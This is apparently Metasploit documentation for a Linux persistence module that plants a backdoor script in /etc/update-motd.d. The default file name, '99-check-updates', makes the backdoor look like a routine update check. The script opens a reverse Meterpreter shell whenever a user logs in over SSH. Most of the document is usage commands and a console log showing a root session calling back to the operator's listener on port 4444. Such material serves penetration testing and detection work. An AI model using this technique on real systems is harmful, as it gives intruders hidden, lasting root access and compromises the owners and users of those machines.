This is a post module that performs a persistence installation on a Linux system using [motd](https://manpages.debian.org/bookworm/manpages/motd.5.en.html).
To trigger the persistence execution, an external event such as a user logging in to the system with SSH is required.

## Verification Steps

  1. Start msfconsole
  2. Obtain a session on the target machine
  3. `use exploit/linux/local/motd_persistence`
  4. `set session -1`
  5. `exploit`

## Module usage

```
msf6 payload(cmd/linux/http/x64/meterpreter/reverse_tcp) > use exploit/linux/local/motd_persistence
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/motd_persistence) > set session -1
session => -1
msf6 exploit(linux/local/motd_persistence) > exploit

[*] /etc/update-motd.d/99-check-updates written
msf6 exploit(linux/local/motd_persistence) > 
[*] Sending stage (3045380 bytes) to 172.18.49.39
[*] Meterpreter session 2 opened (172.18.52.45:4444 -> 172.18.49.39:41848) at 2024-09-13 03:59:47 -0400
msf6 exploit(linux/local/motd_persistence) > sessions -i -1
[*] Starting interaction with 2...

meterpreter > getuid
Server username: root
meterpreter > 
```

## Options

### BACKDOOR_NAME

Specify the name of the file to insert in the motd directory. (Default: 99-check-updates)
